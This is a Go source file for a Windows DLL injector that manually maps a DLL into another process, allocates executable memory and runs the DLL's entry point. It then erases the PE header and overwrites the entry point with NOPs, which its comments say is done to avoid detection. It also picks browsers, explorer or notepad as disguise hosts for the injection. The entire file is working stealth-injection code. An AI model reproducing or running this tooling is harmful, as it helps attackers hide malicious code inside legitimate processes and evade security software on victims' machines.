package injector

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ErasePEHeader erases PE header to avoid detection
func ErasePEHeader(processHandle windows.Handle, baseAddress uintptr) error {
	// Erase PE header, usually fill the first 4KB of PE header memory with zeros
	var bytesWritten uintptr
	zeroBuffer := make([]byte, 4096) // 4KB zero fill

	// Write zero fill to PE header
	err := WriteProcessMemory(processHandle, baseAddress, unsafe.Pointer(&zeroBuffer[0]), uintptr(len(zeroBuffer)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("Failed to erase PE header: %v", err)
	}

	return nil
}

// EraseEntryPoint erases entry point to avoid detection
func EraseEntryPoint(processHandle windows.Handle, baseAddress uintptr) error {
	// 读取PE头，找到入口点，然后用NOP指令覆盖入口点
	// 读取DOS头和NT头，获取入口点RVA
	var dosHeader [64]byte
	var bytesRead uintptr

	// 读取DOS头
	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read DOS header: %v", err)
	}

	// 获取PE头偏移
	peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))

	// 读取标准PE头
	var peHeader [24]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset), &peHeader[0], 24, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read PE header: %v", err)
	}

	// 读取可选PE头
	var optHeader [240]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset)+24, &optHeader[0], 240, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read optional PE header: %v", err)
	}

	// 获取入口点RVA (位于可选PE头的第16字节)
	entryPointRVA := *(*uint32)(unsafe.Pointer(&optHeader[16]))

	// 如果没有入口点，直接返回
	if entryPointRVA == 0 {
		return nil
	}

	// 计算入口点地址
	entryPointAddr := baseAddress + uintptr(entryPointRVA)

	// 创建NOP指令填充
	nopBuffer := make([]byte, 32) // 32字节的NOP指令
	for i := range nopBuffer {
		nopBuffer[i] = 0x90 // x86 NOP指令
	}

	// 写入NOP指令到入口点
	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, entryPointAddr, unsafe.Pointer(&nopBuffer[0]), uintptr(len(nopBuffer)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("Failed to erase entry point: %v", err)
	}

	return nil
}

// ManualMapDLL loads DLL using manual mapping method
func ManualMapDLL(processID uint32, dllBytes []byte, options BypassOptions) error {
	// 检查参数
	if processID == 0 {
		return fmt.Errorf("Process ID cannot be zero")
	}

	if len(dllBytes) == 0 {
		return fmt.Errorf("DLL data cannot be empty")
	}

	fmt.Printf("Starting manual mapping of DLL to process ID: %d, DLL size: %d bytes, using invisible memory: %v\n",
		processID, len(dllBytes), options.InvisibleMemory)

	// 打开目标进程
	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, processID)
	if err != nil {
		return fmt.Errorf("Failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	fmt.Printf("Successfully opened target process\n")

	// 解析PE头
	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		return fmt.Errorf("Failed to parse PE header: %v", err)
	}

	fmt.Printf("Successfully parsed PE header, image size: %d bytes\n", peHeader.OptionalHeader.SizeOfImage)

	// 计算需要分配的内存大小
	imageSize := peHeader.OptionalHeader.SizeOfImage

	// 分配内存基址
	var baseAddress uintptr
	var memAllocErr error

	if options.InvisibleMemory {
		// 尝试在高地址空间分配内存，如果失败则尝试让系统自动选择地址
		// 使用几个不同的高地址尝试
		fmt.Printf("Attempting to allocate invisible memory in high address space...\n")

		// 检查系统架构，64位系统使用更高的地址
		var highAddresses []uintptr
		if unsafe.Sizeof(uintptr(0)) == 8 {
			// 64位系统
			highAddresses = []uintptr{0x7FFF0000000, 0x7FFE0000000, 0x7FFD0000000, 0x70000000}
		} else {
			// 32位系统
			highAddresses = []uintptr{0x70000000, 0x60000000, 0x50000000, 0x40000000}
		}

		for _, addr := range highAddresses {
			fmt.Printf("Trying to allocate memory at address 0x%X...\n", addr)
			baseAddress, memAllocErr = VirtualAllocEx(hProcess, addr, uintptr(imageSize),
				windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
			if memAllocErr == nil {
				fmt.Printf("Successfully allocated memory at address 0x%X\n", baseAddress)
				break // 成功分配了内存
			}
			fmt.Printf("Failed to allocate at 0x%X: %v\n", addr, memAllocErr)
		}

		// 如果所有高地址都失败，尝试让系统自动选择
		if memAllocErr != nil {
			fmt.Printf("Failed to allocate memory in high address space, letting system choose address...\n")
			baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
				windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
			if err != nil {
				return fmt.Errorf("Failed to allocate memory in target process: %v", err)
			}
			fmt.Printf("System selected address: 0x%X\n", baseAddress)
		}
	} else {
		// 正常分配内存，让系统自动选择地址
		fmt.Printf("Letting system choose memory address...\n")

		// 添加详细的调试信息
		fmt.Printf("Process handle: 0x%X\n", hProcess)
		fmt.Printf("Image size: %d bytes (0x%X)\n", imageSize, imageSize)

		// 验证imageSize是否合理
		if imageSize == 0 {
			return fmt.Errorf("Invalid image size: %d", imageSize)
		}
		if imageSize > 0x10000000 { // 256MB限制
			return fmt.Errorf("Image size too large: %d bytes", imageSize)
		}

		baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			return fmt.Errorf("Failed to allocate memory in target process (size: %d): %v", imageSize, err)
		}
		fmt.Printf("System allocated memory at address: 0x%X\n", baseAddress)
	}

	// 映射PE文件各节到远程进程内存
	fmt.Printf("Starting to map PE sections to remote process memory...\n")
	err = MapSections(hProcess, dllBytes, baseAddress, peHeader)
	if err != nil {
		return fmt.Errorf("Failed to map PE sections: %v", err)
	}
	fmt.Printf("Successfully mapped PE sections\n")

	// 修复导入表
	fmt.Printf("Starting to fix import table...\n")
	err = FixImports(hProcess, baseAddress, peHeader)
	if err != nil {
		return fmt.Errorf("Failed to fix import table: %v", err)
	}
	fmt.Printf("Successfully fixed import table\n")

	// 修复重定位
	fmt.Printf("Starting to fix relocations...\n")
	err = FixRelocations(hProcess, baseAddress, peHeader)
	if err != nil {
		return fmt.Errorf("Failed to fix relocations: %v", err)
	}
	fmt.Printf("Successfully fixed relocations\n")

	// 执行DLL入口点
	fmt.Printf("Starting to execute DLL entry point...\n")
	err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
	if err != nil {
		return fmt.Errorf("Failed to execute DLL entry point: %v", err)
	}
	fmt.Printf("Successfully executed DLL entry point\n")

	// 应用反检测技术
	if options.ErasePEHeader {
		fmt.Printf("Erasing PE header for stealth...\n")
		err = ErasePEHeader(hProcess, baseAddress)
		if err != nil {
			fmt.Printf("Warning: Failed to erase PE header: %v\n", err)
			// 不返回错误，因为这不是关键操作
		} else {
			fmt.Printf("Successfully erased PE header\n")
		}
	}

	if options.EraseEntryPoint {
		fmt.Printf("Erasing entry point for stealth...\n")
		err = EraseEntryPoint(hProcess, baseAddress)
		if err != nil {
			fmt.Printf("Warning: Failed to erase entry point: %v\n", err)
			// 不返回错误，因为这不是关键操作
		} else {
			fmt.Printf("Successfully erased entry point\n")
		}
	}

	fmt.Printf("Manual mapping of DLL completed, base address: 0x%X\n", baseAddress)
	return nil
}

// FindLegitProcess 查找合法进程进行注入
func FindLegitProcess() (uint32, string, error) {
	// 常见的合法用户进程名称，避免选择系统进程
	legitimateProcesses := []string{
		"notepad.exe",
		"explorer.exe",
		"msedge.exe",
		"chrome.exe",
		"firefox.exe",
		"iexplore.exe",
		"calc.exe",
		"mspaint.exe",
	}

	// 获取系统进程列表
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to create process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var processEntry windows.ProcessEntry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))

	// 查找合法进程
	var targetPID uint32
	var targetName string

	err = windows.Process32First(snapshot, &processEntry)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to get first process: %v", err)
	}

	for {
		processName := windows.UTF16ToString(processEntry.ExeFile[:])
		for _, legitName := range legitimateProcesses {
			if processName == legitName {
				// 尝试打开进程检查是否有访问权限
				hProcess, err := windows.OpenProcess(
					windows.PROCESS_CREATE_THREAD|
						windows.PROCESS_VM_OPERATION|
						windows.PROCESS_VM_WRITE|
						windows.PROCESS_VM_READ|
						windows.PROCESS_QUERY_INFORMATION,
					false, processEntry.ProcessID)

				if err == nil {
					// 如果能成功打开进程，则选择该进程
					windows.CloseHandle(hProcess)
					targetPID = processEntry.ProcessID
					targetName = processName
					fmt.Printf("Found accessible legitimate process: %s (PID: %d)\n", targetName, targetPID)
					break
				}
				// 如果无法打开进程，继续查找下一个
			}
		}

		if targetPID != 0 {
			break
		}

		err = windows.Process32Next(snapshot, &processEntry)
		if err != nil {
			break
		}
	}

	if targetPID == 0 {
		// 如果找不到现有的合法进程，尝试启动一个新的记事本进程
		fmt.Println("Could not find accessible legitimate process, trying to start Notepad...")

		// 创建记事本进程
		si := windows.StartupInfo{}
		pi := windows.ProcessInformation{}

		si.Cb = uint32(unsafe.Sizeof(si))

		// 构建命令行
		cmdLine, _ := windows.UTF16PtrFromString("notepad.exe")

		err := windows.CreateProcess(
			nil,
			cmdLine,
			nil,
			nil,
			false,
			windows.CREATE_NEW_CONSOLE,
			nil,
			nil,
			&si,
			&pi)

		if err != nil {
			return 0, "", fmt.Errorf("Failed to start Notepad process: %v", err)
		}

		// 关闭不需要的句柄
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)

		targetPID = pi.ProcessId
		targetName = "notepad.exe"
		fmt.Printf("Started new Notepad process: PID %d\n", targetPID)
	}

	if targetPID == 0 {
		return 0, "", fmt.Errorf("Could not find or create a legitimate process for injection")
	}

	return targetPID, targetName, nil
}
